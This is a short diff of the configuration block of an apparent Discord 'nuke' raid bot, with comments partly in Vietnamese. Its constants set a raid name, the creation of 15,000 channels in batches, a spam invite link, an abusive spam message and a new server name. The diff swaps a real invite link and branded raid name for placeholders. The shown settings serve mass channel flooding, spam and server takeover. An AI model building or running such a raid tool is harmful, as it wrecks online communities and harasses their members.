@@ -8,10 +8,10 @@ import os
 # ===== CẤU HÌNH GỐC (NUKE) =====
 TOKEN = "DISCORD_TOKEN"
 OWNER_IDS = [ID_ALLOW]
-RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
+RAID_NAME = " NAME_GUILD MOI"
 CHANNEL_COUNT = 15000
 BATCH_SIZE = 80
-SPAM_LINK = "https://discord.gg/AJDpu9sqar"
+SPAM_LINK = "LINK_SERVER"
 SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
 NEW_GUILD_NAME = "TÊN MỚI SERVER"
 
